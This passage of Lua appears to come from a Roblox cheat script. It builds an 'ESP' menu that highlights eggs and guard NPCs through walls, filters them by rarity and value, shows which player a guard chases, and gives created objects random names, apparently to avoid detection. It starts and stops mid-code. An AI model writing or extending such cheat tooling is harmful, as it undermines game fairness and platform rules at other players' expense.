			local tbl25 = {}
			local tbl26 = { 0, Color3.fromRGB(60, 66, 78) }
			local tbl27 = { 0.55, Color3.fromRGB(30, 33, 40) }
			local tbl28 = { 1, Color3.fromRGB(10, 11, 14) }
			tbl25[1] = tbl26
			tbl25[2] = tbl27
			tbl25[3] = tbl28
			silver.Stroke = sequence3(tbl25)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			tbl20.Silver = silver
		end

		tbl20.Sakura = tbl6.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		tbl20.GreatBloom = tbl6.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		tbl20.Boss = tbl6.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		tbl20.Monstrous = tbl6.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local sequence2 = tbl6.Sequence
			local tbl21 = {}
			local tbl22 = { 0, Color3.fromRGB(255, 107, 107) }
			local tbl23 = { 0.2, Color3.fromRGB(255, 179, 107) }
			local tbl24 = { 0.4, Color3.fromRGB(255, 240, 107) }
			local tbl25 = { 0.6, Color3.fromRGB(107, 255, 138) }
			local tbl26 = { 0.8, Color3.fromRGB(107, 200, 255) }
			local tbl27 = { 1, Color3.fromRGB(185, 107, 255) }
			tbl21[1] = tbl22
			tbl21[2] = tbl23
			tbl21[3] = tbl24
			tbl21[4] = tbl25
			tbl21[5] = tbl26
			tbl21[6] = tbl27
			rainbow.Text = sequence2(tbl21)
			local sequence3 = tbl6.Sequence
			local tbl28 = {}
			local tbl29 = { 0, Color3.fromRGB(20, 20, 30) }
			local tbl30 = { 1, Color3.fromRGB(8, 8, 12) }
			tbl28[1] = tbl29
			tbl28[2] = tbl30
			rainbow.Stroke = sequence3(tbl28)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			tbl20.Rainbow = rainbow
		end

		local v13
		v13 = tbl6.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot
		rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local n17
		n17 = 0
		local tbl21

		tbl21 = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = tbl9[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, v14 in ipairs(tbl8) do
			tbl21.Info[v14] = true
		end

		local tbl22
		tbl22 = {}
		local tbl23, v14, flag2, n18, n19, flag3, v15, n20, fn16
		local tbl24 = {}
		tbl23 = {}
		v14 = nil
		flag2 = false
		n18 = 0
		n19 = 0
		flag3 = false
		v15 = nil
		n20 = 0

		fn16 = function(arg)
			local v16 = tbl24[arg]
			if v16 then
				return v16
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag4 = type(directory) == "table" and directory[arg]
			local rarity = type(flag4) == "table" and type(flag4.Rarity) == "table" and flag4.Rarity or nil
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
			local v17 = tbl6.PaletteFromColor(color3)
			local rarityGradient = rarity and rarity.RarityGradient

			if rarity and typeof(rarityGradient) ~= "Instance" then
				rarityGradient = ReplicatedStorage:FindFirstChild("Assets")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("UI")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")

				if rarityGradient then
					rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
				v17.Text = rarityGradient.Color
				v17.Rotation = rarityGradient.Rotation
			end

			local name

			if rarity then
				name = tostring(rarity.DisplayName or rarity._id or "")
			else
				name = rarity
			end

			name = name or ""
			local rarityPalette

			if string.upper(name) ~= "SECRET" then
				rarityPalette = v17
			else
				rarityPalette = { Text = v11, Stroke = v17.Stroke, Outline = v17.Outline, Rotation = 90 }
			end

			local tbl25 = {}

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl25.Number = rarity or 0
			tbl25.Name = name
			tbl25.Color = color3
			tbl25.Palette = v17
			tbl25.RarityPalette = rarityPalette
			local displayName = type(flag4) == "table"

			if displayName then
				displayName = tostring(flag4.DisplayName or arg)
			end

			tbl25.DisplayName = displayName or tostring(arg)
			tbl25.Icon = type(flag4) == "table" and flag4.Icon or nil
			tbl25.EarningRate = type(flag4) == "table" and tonumber(flag4.EarningRate) or 0
			tbl24[arg] = tbl25
			return tbl25
		end

		local fn17, fn18, fn19, tbl25, fn20

		do
			local function fn21(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			local function fn22()
				if not v15 or not v15.Parent then
					v15 = tbl6.CreateRuntime()
				end
			end

			local function fn23(arg)
				local n21 = tonumber(arg) or 0
				local tbl26 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n22 = 1

				while math.abs(n21) >= 1000 and n22 < #tbl26 do
					n21 /= 1000
					n22 += 1
				end

				return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl26[n22])
			end

			local function fn24(arg)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return tbl21.MaxDistance
				end
				return math.min(tbl21.MaxDistance, arg * currentCamera.ViewportSize.Y / 2 * n15 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function fn25(arg)
				local tbl26 = {
					{ arg.IconHolder, tbl10.Icon, arg.ShowIcon },
					{ arg.NameRow.Holder, tbl10.Name, arg.ShowName },
					{ arg.RarityRow.Holder, tbl10.Rarity, arg.ShowRarity },
					{ arg.MutationRow.Holder, tbl10.Mutation, arg.ShowMutation },
					{ arg.ValueRow.Holder, tbl10.Value, arg.ShowValue },
					{ arg.ExtraRow.Holder, tbl10.Info, arg.ShowExtra },
				}

				local n21 = 0

				for _, v16 in ipairs(tbl26) do
					if v16[3] then
						n21 += v16[2]
					end
				end

				local n22 = math.max(n21, 1)

				for _, v16 in ipairs(tbl26) do
					v16[1].Visible = v16[3]
					v16[1].Size = UDim2.fromScale(1, v16[3] and v16[2] / n22 or 0)
				end

				local v16 = tbl6.ScaledWidth(120, tbl21.SizeScale)
				local height = math.max(1, math.floor(tbl6.RowHeight(tbl21.SizeScale) * n22))

				if arg.Width ~= v16 or arg.Height ~= height or arg.Fixed ~= tbl21.FixedSize then
					arg.Width = v16
					arg.Height = height
					arg.Fixed = tbl21.FixedSize

					if tbl21.FixedSize then
						local n23 = n14 * tbl21.SizeScale
						arg.Billboard.Size = UDim2.fromScale(n23, n23 * height / v16)
						arg.Billboard.MaxDistance = fn24(n23)
					else
						arg.Billboard.Size = UDim2.fromOffset(v16, height)
						arg.Billboard.MaxDistance = tbl21.MaxDistance
					end
				end
			end

			fn17 = function(arg)
				arg.Width = nil
				fn25(arg)
			end

			local function fn26()
				local v16, v17 = tbl6.CreateTag(v15, tbl21.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
				frame.Parent = v17
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local tbl26 = {
					Billboard = v16,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 1, 0.4),
					RarityRow = tbl6.CreateTextRow(v17, v6, 2, 0.2),
					MutationRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 3, 0.2),
					ValueRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 4, 0.2),
					ExtraRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				fn25(tbl26)
				return tbl26
			end

			local function fn27(arg)
				if arg.Highlight then
					arg.Highlight:Destroy()
					arg.Highlight = nil
					n20 -= 1
				end
			end

			local function fn28(arg, arg2)
				local n21 = tonumber(arg.AssetScale) or 1
				local n22 = n21 > 5 and (n21 / 5) ^ 1.2 * 19.637875755794113 or n21 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n23 = 1

				if flag4 then
					local ok
					ok, n23 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag5 = ok and type(n23) == "number"
					local n24 = 1

					if not flag5 then
						n23 = n24
					end
				end

				return arg2.EarningRate * n22 * n23
			end

			local function fn29()
				local tbl26 = {}
				local eggState = tbl.EggState
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl26
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl26
				end
				local str = tostring(localPlayer.UserId)
				local tbl27 = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) then
						tbl27[#tbl27 + 1] = child
					end
				end

				for k, v16 in pairs(result) do
					if type(v16) == "table" and v16.Placement ~= nil and type(v16.AssetCategory) == "string" then
						local base = tostring(k)
						local v17 = nil

						for _, v18 in ipairs(tbl27) do
							if v18.Name == base or string.find(v18.Name, base, 1, true) or v18:GetAttribute("Uid") == base then
								v17 = v18
								break
							end
						end

						if v17 then
							local ok2, result2 = pcall(function()
								return v17:IsA("Model") and v17:GetPivot() or v17.CFrame
							end)

							local mutations = type(v16.Mutations) == "table" and v16.Mutations or {}

							tbl26[#tbl26 + 1] = {
								Uid = "base:" .. base,
								AssetCategory = v16.AssetCategory,
								AssetScale = v16.AssetScale,
								Mutations = mutations,
								BaseMutation = v16.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and result2 or nil,
								Model = v17,
							}
						end
					end
				end

				return tbl26
			end

			local function fn30(arg, arg2)
				if arg.State == "Claimed" then
					return false
				end

				if tbl21.MinRarity > 0 and arg2.Number < tbl21.MinRarity then
					return false
				end
				local flag4 = tbl21.MinValue > 0

				if flag4 then
					local minValue = tbl21.MinValue
					flag4 = fn28(arg, arg2) < minValue
				end

				if flag4 then
					return false
				end
				return true
			end

			local function fn31(arg, arg2, arg3)
				local model, hitbox

				if typeof(arg2.Model) == "Instance" then
					model = arg2.Model
					hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					hitbox = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, hitbox = fn21(arg2.Uid)
				end

				local bottomCFrame = arg2.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = hitbox or workspace.Terrain

					if arg.Anchor ~= terrain or arg.CFrame ~= bottomCFrame then
						arg.Anchor = terrain
						arg.CFrame = bottomCFrame
						arg.Billboard.Adornee = terrain
						arg.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (hitbox and hitbox.Position.Y - bottomCFrame.Position.Y or 1) + n13, 0)
					end
				end

				local info = tbl21.Info
				local baseMutation = arg2.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local n21 = tonumber(arg2.AssetScale) or 1
				local showIcon = info.Icon == true and arg3.Icon ~= nil

				if showIcon and arg.Icon.Image ~= tostring(arg3.Icon) then
					arg.Icon.Image = tostring(arg3.Icon)
				end

				local showName = info.Name == true

				if showName then
					tbl6.SetRow(arg.NameRow, arg3.DisplayName, tbl19)
				end

				local showRarity = info.Rarity == true and arg3.Name ~= ""

				if showRarity then
					local rarityPalette = arg3.RarityPalette
					tbl6.SetRow(arg.RarityRow, string.upper(arg3.Name), rarityPalette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					tbl6.SetRow(arg.MutationRow, string.upper(fn7(baseMutation)), tbl20[baseMutation] or v13)
				end

				local showValue = info.Value == true

				if showValue then
					tbl6.SetRow(arg.ValueRow, "$" .. fn23(fn28(arg2, arg3)) .. "/s", v12)
				end

				local tbl26 = {}
				local eggRecords = tbl.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg2.AssetCategory, n21)

					if ok and tonumber(result) then
						table.insert(tbl26, fn23(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(tbl26, string.format("x%.2f", n21))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, arg2)

					if ok and tonumber(result) then
						table.insert(tbl26, "$" .. fn23(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						table.insert(tbl26, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and arg2.AreaId ~= nil then
					table.insert(tbl26, tostring(arg2.AreaId))
				end

				if info.State and arg2.State ~= nil and arg2.State ~= "Slot" then
					table.insert(tbl26, tostring(arg2.State))
				end

				local showExtra = #tbl26 > 0

				if showExtra then
					tbl6.SetRow(arg.ExtraRow, table.concat(tbl26, "  |  "), tbl6.Palettes.Sheen)
				end

				if arg.ShowIcon ~= showIcon or arg.ShowName ~= showName or arg.ShowRarity ~= showRarity or arg.ShowMutation ~= showMutation or arg.ShowValue ~= showValue or arg.ShowExtra ~= showExtra then
					arg.ShowIcon = showIcon
					arg.ShowName = showName
					arg.ShowRarity = showRarity
					arg.ShowMutation = showMutation
					arg.ShowValue = showValue
					arg.ShowExtra = showExtra
					fn25(arg)
				end

				if (tbl21.Highlight == tbl9[3] or tbl21.Highlight == tbl9[2] and arg3.Number >= tbl21.HighlightMin) and model then
					if not arg.Highlight and n20 < n then
						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = arg3.Color
						highlight.OutlineColor = arg3.Palette.Outline
						highlight.Parent = v15
						arg.Highlight = highlight
						n20 += 1
					end

					if arg.Highlight and arg.Highlight.Adornee ~= model then
						arg.Highlight.Adornee = model
					end
				else
					fn27(arg)
				end
			end

			local function fn32(arg)
				fn27(arg)
				arg.Billboard:Destroy()
			end

			local function fn33()
				local v16 = tbl22
				local v17 = v15
				tbl22 = {}
				v15 = nil
				n20 = 0

				task.spawn(function()
					local now = os.clock()

					for _, v18 in pairs(v16) do
						if v18.Highlight then
							v18.Highlight:Destroy()
						end

						v18.Billboard:Destroy()

						if n16 < os.clock() - now then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if v17 then
						v17:Destroy()
					end
				end)
			end

			local function fn34(arg, arg2, arg3)
				local function fn35()
					return arg2 == n19 and arg3 == n18 and flag2
				end

				fn22()
				local tbl26 = {}
				local now = os.clock()

				for _, v16 in pairs(arg) do
					local uid = type(v16) == "table" and v16.Uid

					if type(uid) == "string" and type(v16.AssetCategory) == "string" then
						local v17 = fn16(v16.AssetCategory)

						if tbl21.Eggs and fn30(v16, v17) then
							tbl26[uid] = true
							local v18 = tbl22[uid]

							if not v18 then
								v18 = fn26()
								tbl22[uid] = v18
							end

							fn31(v18, v16, v17)
						end
					end

					if os.clock() - now > n16 then
						RunService.Heartbeat:Wait()
						now = os.clock()
						if not fn35() then
							return
						end
					end
				end

				if tbl21.Eggs and tbl21.OwnBase then
					for _, v16 in ipairs(fn29()) do
						local v17 = fn16(v16.AssetCategory)

						if fn30(v16, v17) then
							tbl26[v16.Uid] = true
							local v18 = tbl22[v16.Uid]

							if not v18 then
								v18 = fn26()
								tbl22[v16.Uid] = v18
							end

							fn31(v18, v16, v17)
						end
					end
				end

				for k, v16 in pairs(tbl22) do
					if not tbl26[k] then
						tbl22[k] = nil
						fn32(v16)
					end
				end

				return true
			end

			local flag4 = false
			local flag5 = false

			fn18 = function()
				if not flag2 or not v14 then
					return
				end
				flag4 = true
				if flag5 then
					return
				end
				flag5 = true

				task.defer(function()
					while flag2 and v14 and flag4 do
						flag4 = false
						n19 += 1
						local ok, result = pcall(fn34, v14, n19, n18)

						if ok and result ~= true then
							flag4 = true
						end

						RunService.Heartbeat:Wait()
					end

					flag5 = false
				end)
			end

			local function fn35()
				local v16 = n18

				if v14 and next(tbl22) == nil then
					fn18()
				end

				local eggState = tbl.EggState
				local flag6 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
				local records = nil

				if flag6 then
					local ok, result = pcall(eggState.ReadFieldEggs)
					ok = ok and type(result) == "table" and type(result.Records) == "table"
					records = nil

					if ok then
						records = result.Records
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n17 then
					n17 = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if v16 ~= n18 or not flag2 then
					return
				end

				if records ~= nil then
					local tbl26 = {}

					for k, record in pairs(records) do
						tbl26[k] = record
					end

					v14 = tbl26
				end

				if v14 then
					fn18()
				end
			end

			local function fn36()
				task.spawn(pcall, fn35)
			end

			local function fn37()
				if flag3 then
					return
				end
				flag3 = true

				task.delay(0.5, function()
					flag3 = false

					if flag2 then
						fn36()
					end
				end)
			end

			fn19 = function()
				for _, v16 in pairs(tbl22) do
					fn17(v16)
				end
			end

			local function fn38()
				flag2 = false
				n18 += 1
				n19 += 1
				tbl6.DisconnectAll(tbl23)
				fn33()
			end

			local function fn39()
				if flag2 then
					fn36()
					return
				end
				flag2 = true
				local v16 = n18
				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v17 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local v18 = eggState[v17]

						if type(v18) == "table" and type(v18.Connect) == "function" then
							local ok, result = pcall(v18.Connect, v18, fn37)

							if ok and result then
								table.insert(tbl23, result)
							end
						end
					end
				end

				for _, v17 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local v18 = workspace:FindFirstChild(v17)

					if v18 then
						table.insert(tbl23, v18.ChildAdded:Connect(fn37))
						table.insert(tbl23, v18.ChildRemoved:Connect(fn37))
					end
				end

				task.spawn(function()
					while v16 == n18 do
						task.wait(10)
						if v16 == n18 then
							fn37()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while v16 == n18 do
						task.wait(1)

						if v16 == n18 then
							if tbl21.Info.Distance then
								fn18()
							end

							continue
						end

						break
					end
				end)

				fn36()
			end

			local function fn40()
				if tbl21.Eggs then
					fn39()
				else
					fn38()
				end
			end

			tbl25 = { Eggs = nil }
			local tbl26 = { Eggs = false }
			local flag6 = false

			local function fn41()
				if flag6 then
					return
				end
				local v16 = tbl6.ReadToggle(tbl25.Eggs, tbl26.Eggs)
				if v16 == tbl21.Eggs and flag2 == v16 then
					return
				end
				tbl21.Eggs = v16
				fn40()
			end

			fn4(function()
				flag6 = true
				tbl21.Eggs = false
				fn38()
			end)

			fn20 = function(arg)
				local tbl27 = {}

				if type(arg) == "table" then
					for k, v16 in pairs(arg) do
						k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16 or nil

						if k then
							tbl27[k] = true
						end
					end
				end

				return tbl27
			end

			tbl25.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(arg)
					tbl26.Eggs = arg == true
					tbl6.SyncSoon(fn41)
				end,
			})
		end

		espSection:CreateToggle({
			Name = "ESP Fixed Size",
			Default = false,
			SubOf = tbl25.Eggs,
			Callback = function(arg)
				local fixedSize = arg == true

				if tbl21.FixedSize ~= fixedSize then
					tbl21.FixedSize = fixedSize
					fn19()
				end
			end,
		})

		espSection:CreateToggle({
			Name = "ESP Own Base Eggs",
			Note = "Also show the eggs placed in your own base",
			Default = true,
			SubOf = tbl25.Eggs,
			Callback = function(arg)
				tbl21.OwnBase = arg ~= false
				fn18()
			end,
		})

		do
			local tbl26 = { "Any" }
			local tbl27 = { Any = 0 }
			local tbl28 = {}
			local tbl29 = {}
			local tbl30 = { "Any Mutation", "No Mutation" }
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl31 = {}
			local tbl32 = {}

			if type(directory) == "table" then
				for k, v16 in pairs(directory) do
					local rarity = type(v16) == "table" and v16.Rarity or nil
					local flag4 = type(rarity) == "table"

					if flag4 then
						flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag4 = flag4 or nil

					if flag4 then
						local str = tostring(rarity.DisplayName or rarity._id or flag4)
						tbl31[flag4] = tbl31[flag4] or str

						table.insert(tbl32, {
							Category = tostring(k),
							Name = tostring(v16.DisplayName or k),
							Rarity = flag4,
							RarityName = str,
						})
					end
				end
			end

			local tbl33 = {}

			for k in pairs(tbl31) do
				table.insert(tbl33, k)
			end

			table.sort(tbl33)

			for _, v16 in ipairs(tbl33) do
				local str = string.format("%d - %s", v16, tbl31[v16])
				table.insert(tbl26, str)
				tbl27[str] = v16
			end

			table.sort(tbl32, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v16 in ipairs(tbl32) do
				local str = string.format("%s [%s]", v16.Name, v16.RarityName)

				if tbl29[str] then
					str = string.format("%s [%s] (%s)", v16.Name, v16.RarityName, v16.Category)
				end

				table.insert(tbl28, str)
				tbl29[str] = v16.Category
			end

			local tbl34 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl34, tostring(k))
				end
			end

			table.sort(tbl34)

			for _, v16 in ipairs(tbl34) do
				table.insert(tbl30, v16)
			end

			local function fn21(arg)
				for _, v16 in ipairs(tbl26) do
					if tbl27[v16] == arg then
						return v16
					end
				end

				return tbl26[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = tbl26,
				Default = fn21(5),
				SubOf = tbl25.Eggs,
				Callback = function(arg)
					tbl21.MinRarity = tbl27[type(arg) == "table" and arg[1] or arg] or 0
					fn18()
				end,
			})
		end

		fn6(espSection:CreateMultiDropdown({
			Name = "ESP Show Info",
			Options = tbl7,
			Default = tbl8,
			SubOf = tbl25.Eggs,
			Callback = function(arg)
				tbl21.Info = fn20(arg)
				fn18()
			end,
		}))

		do
			local tbl26 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n21 = 0
			local str = "M/s"

			local function fn21(arg, arg2)
				if arg ~= nil then
					n21 = math.max(0, math.floor(tonumber(arg) or n21))
				end

				if arg2 ~= nil then
					str = tostring(arg2)
				end

				tbl21.MinValue = n21 * (tbl26[str] or tbl26["M/s"]).Mult
				fn18()
			end

			fn5(espSection, {
				Name = "Min ESP Value",
				SubOf = tbl25.Eggs,
				Legacy = "ESP Min Value",
				SectionName = "ESP",
				OnRaw = function(arg)
					fn21(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = tbl25.Eggs,
			Callback = function(arg)
				local num = tonumber(arg)

				if num and tbl21.SizeScale ~= num / 100 then
					tbl21.SizeScale = num / 100
					fn19()
				end
			end,
		})

		do
			local n21 = 1
			local n22 = 0.75

			local tbl26 = {
				Sleeping = tbl6.Palettes.Accent,
				Waking = tbl6.Palettes.Gold,
				Chasing = tbl6.Palettes.Red,
			}

			local orange = tbl6.Palettes.Orange
			local tbl27 = {}
			local tbl28 = {}
			local flag4 = false
			local v16 = nil

			local function fn21(arg)
				local attribute = arg:GetAttribute("GuardState")
				if attribute == "Sleeping" then
					return "Sleeping"
				end

				if attribute == "Waking" then
					return "Waking Up"
				end

				if attribute == "Chasing" then
					local attribute2 = arg:GetAttribute("TargetPlayer")
					if attribute2 == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
					return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
				end

				return attribute and tostring(attribute) or "Awake"
			end

			local function fn22(arg, arg2)
				local v17 = tbl26[arg2:GetAttribute("GuardState")] or orange
				arg.Highlight.FillColor = v17.Outline
				arg.Highlight.OutlineColor = v17.Outline
				tbl6.SetRow(arg.StateRow, fn21(arg2), v17)
			end

			local function fn23(arg)
				local floor = math.floor
				arg.Tag.Size = UDim2.fromOffset(tbl6.ScaledWidth(115, n22), floor(tbl6.RowHeight(n22) * 1.6))
			end

			local function fn24(arg)
				local v17 = tbl27[arg]
				if not v17 then
					return
				end
				tbl27[arg] = nil
				tbl6.DisconnectAll(v17.Connections)
				v17.Highlight:Destroy()
				v17.Tag:Destroy()
			end

			local function fn25(arg, adornee)
				if tbl27[adornee] then
					return
				end
				local v17 = tbl6.FindGuardRoot(adornee)
				if not v17 then
					return
				end

				if not v16 or not v16.Parent then
					v16 = tbl6.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = v16
				local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
				ok = ok and typeof(result) == "CFrame"
				local n23 = 6

				if ok then
					n23 = result.Position.Y + result2.Y * 0.5 - v17.Position.Y + n21
				end

				local v18, v19 = tbl6.CreateTag(v16, math.huge)
				v18.Adornee = v17
				v18.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
				local v20 = tbl6.CreateTextRow(v19, tbl6.StatusFont, 1, 0.45)
				local v21 = tbl6.CreateTextRow(v19, tbl6.StatusFont, 2, 0.55)
				local sheen = tbl6.Palettes.Sheen
				tbl6.SetRow(v20, tostring(arg) .. " Guard", sheen)
				local tbl29 = { Highlight = highlight, Tag = v18, StateRow = v21, Connections = {} }
				tbl27[adornee] = tbl29
				fn23(tbl29)
				fn22(tbl29, adornee)

				local function fn26()
					fn22(tbl29, adornee)
				end

				table.insert(tbl29.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(fn26))
				table.insert(tbl29.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(fn26))

				table.insert(tbl29.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						fn24(adornee)
					end
				end))
			end

			local function fn26()
				flag4 = false
				tbl6.DisconnectAll(tbl28)

				for k in pairs(tbl27) do
					fn24(k)
				end

				if v16 then
					v16:Destroy()
					v16 = nil
				end
			end

			local function fn27()
				if flag4 then
					return
				end
				flag4 = true
				tbl28 = tbl6.WatchGuards(fn25)
			end

			local v17 = nil
			local flag5 = false
			local flag6 = false

			local function fn28()
				if flag6 then
					return
				end

				if tbl6.ReadToggle(v17, flag5) then
					fn27()
				elseif flag4 then
					fn26()
				end
			end

			fn4(function()
				flag6 = true
				fn26()
			end)

			v17 = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl6.SyncSoon(fn28)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v17,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n22 ~= num / 100 then
						n22 = num / 100

						for _, v18 in pairs(tbl27) do
							fn23(v18)
						end
					end
				end,
			})
		end

		do
			local tbl26 = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local v16 = tbl6.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accent = tbl6.Palettes.Accent
			local v17 = nil
			local tbl27 = {}
			local flag4 = false
			local connection = nil
			local v18 = nil
			local flag5 = false
			local flag6 = false

			local function fn21(arg)
				local v19 = tbl27[arg]
				if not v19 then
					return
				end
				tbl27[arg] = nil

				pcall(function()
